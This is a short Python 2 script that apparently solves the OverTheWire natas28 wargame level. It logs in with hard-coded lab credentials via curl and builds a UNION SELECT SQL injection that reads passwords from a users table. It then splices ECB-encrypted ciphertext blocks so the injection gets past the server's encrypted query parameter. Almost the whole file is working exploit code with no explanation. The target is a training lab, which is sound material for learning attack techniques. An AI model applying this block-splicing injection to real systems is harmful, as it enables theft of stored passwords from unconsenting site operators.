import base64
import subprocess
import urllib

# make a request with input and parse out the resulting encrypted query param
def get_query_param(s):
	s = urllib.quote_plus(s)
	result = subprocess.check_output('curl -I -u natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF http://natas28.natas.labs.overthewire.org?query=' + s + ' 2>/dev/null', shell=True)
	key = "Location: search.php/?query="
	position = result.find(key)
	position += len(key)
	start = position
	while result[position] != '\n':
		position += 1
		encoded = result[start:position]
		decoded = urllib.unquote(encoded).decode('utf8')

	return base64.b64decode(decoded)


payload = (" " * 9) + "' UNION ALL SELECT password FROM users;#"

offset = 48 + 16 * 3

injection_payload = get_query_param(payload)

# Construct a query with an open quote
space = " " * 10
dummy_query = get_query_param(space)

# Sneak in the encrypted payload of the sql injection
encoded_url = base64.b64encode(dummy_query[0:48] + injection_payload[48:offset] + dummy_query[48:])
url = urllib.quote_plus(encoded_url)

print url